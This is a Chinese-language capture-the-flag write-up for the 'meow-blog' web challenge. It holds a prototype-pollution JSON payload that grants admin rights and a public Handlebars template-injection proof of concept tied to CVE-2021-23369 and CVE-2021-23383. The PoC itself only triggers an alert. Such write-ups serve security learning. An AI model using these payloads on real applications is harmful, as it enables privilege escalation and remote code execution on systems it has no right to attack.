## Web
### meow-blog

 原型链污染，获取admin权限
 
![](attachments/Pasted%20image%2020231017203527.png)

`{"username":"wum0nster","password":"123","submit":[{"__proto__":{"user":{"id":1,"username":"admin","style":"wum0nster"}}},"1"]}`

模板注入漏洞点

![](attachments/Pasted%20image%2020231018083914.png)

![](attachments/Pasted%20image%2020231018084420.png)

[Prototype Pollution in handlebars · CVE-2021-23383 · GitHub Advisory Database](https://github.com/advisories/GHSA-765h-qjxv-5f44)

[Remote Code Execution (RCE) in handlebars | CVE-2021-23369 | Snyk](https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1056767)

```js
<script src="https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js"></script> 
<script> 
// compile the template 
var s = ` 
{{#with (__lookupGetter__ "__proto__")}} 
{{#with (./constructor.getOwnPropertyDescriptor . "valueOf")}} 
{{#with ../constructor.prototype}} 
{{../../constructor.defineProperty . "hasOwnProperty" ..}} 
{{/with}} 
{{/with}} 
{{/with}} 
{{#with "constructor"}} 
{{#with split}} 
{{pop (push "alert('Vulnerable Handlebars JS when compiling in strict mode');")}} 
{{#with .}} 
{{#with (concat (lookup join (slice 0 1)))}} 
{{#each (slice 2 3)}} 
{{#with (apply 0 ../..)}} 
{{.}} 
{{/with}} 
{{/each}} 
{{/with}} 
{{/with}} 
{{/with}} 
{{/with}} 
`; 
var template = Handlebars.compile(s, { 
strict: true 
}); 
// execute the compiled template and print the output to the console console.log(template({})); 
</script>
```

[运行时参数 | Handlebars中文文档 | Handlebars中文网 (handlebarsjs.cn)](https://www.handlebarsjs.cn/api-reference/runtime-options.html#%E6%8E%A7%E5%88%B6%E5%8E%9F%E5%9E%8B%E8%AE%BF%E9%97%AE%E7%9A%84%E9%80%89%E9%A1%B9)

在题目环境中升级到了4.7.7，禁用原本的一些键

![](attachments/Pasted%20image%2020231018093750.png)





